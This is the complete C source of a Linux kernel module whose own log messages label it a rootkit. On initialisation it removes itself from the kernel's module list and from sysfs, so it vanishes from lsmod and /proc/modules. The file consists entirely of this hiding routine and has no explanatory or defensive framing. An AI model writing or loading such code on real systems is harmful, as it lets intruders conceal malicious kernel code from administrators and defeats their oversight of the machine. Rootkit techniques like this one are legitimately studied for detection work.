#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/kobject.h>

int hide_module(void);

int hide_module(void) {
    list_del(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
    return 0;
}

static int __init mod_init(void) {
    printk(KERN_INFO "rootkit: init\n");
    hide_module();
    return 0;
}

static void __exit mod_exit(void) {
    printk(KERN_INFO "rootkit: exit\n");
}

module_init(mod_init);
module_exit(mod_exit);

MODULE_LICENSE("GPL");